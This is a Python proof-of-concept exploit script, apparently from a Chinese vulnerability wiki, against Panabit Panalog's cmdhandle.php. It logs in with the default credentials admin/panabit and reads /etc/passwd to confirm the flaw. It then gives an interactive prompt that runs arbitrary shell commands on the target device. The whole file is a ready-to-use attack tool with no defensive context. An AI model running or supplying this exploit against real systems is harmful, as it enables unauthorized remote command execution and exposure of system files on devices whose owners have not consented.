import requests
import sys
import random
import re
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mTitle  : Panabit Panalog cmdhandle.php 后台命令执行漏洞                   \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/login.php"
    cookie = "PHPSESSID=111111111111111111111peiqi"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": cookie
    }
    data = "user=admin&mypass=panabit&sec=1619123700835.617&useldap=0"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers,data=data, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/login.php.... \033[0m".format(target_url))
        if "yes" in response.text and "yn" in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 存在默认口令 admin/panabit \033[0m".format(target_url))
            print("\033[36m[o] 设置Cookie : {} \033[0m".format(cookie))
            POC_2(target_url, cookie)
        else:
            print("\033[31m[x] 请求失败 \033[0m")
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_2(target_url, Cookie):
    vuln_url = target_url + "/Maintain/cmdhandle.php"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "{}".format(Cookie)
    }
    data = "cmd=cat /etc/passwd"
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url,data=data, headers=headers, verify=False, timeout=5)
        if 'root' in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {}存在漏洞 ,执行 cat /etc/passwd \033[0m".format(target_url))
            print("\033[36m[o] 响应为:\n{} \033[0m".format(response.text))
            while True:
                Cmd = input("\033[35mCmd >>> \033[0m")
                if Cmd == "exit":
                    sys.exit(0)
                else:
                    POC_3(target_url, Cmd, Cookie)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

def POC_3(target_url, Cmd, Cookie):
    Cmd = Cmd.replace(" ", "%20")
    vuln_url = target_url + "/Maintain/cmdhandle.php"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Cookie": "{}".format(Cookie)
    }
    data = "cmd={}".format(Cmd)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data,headers=headers, verify=False, timeout=5)
        response_data = response.text.replace("<br/>", "\n")
        print("\033[36m[o] 响应为:\n{} \033[0m".format(response_data))

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)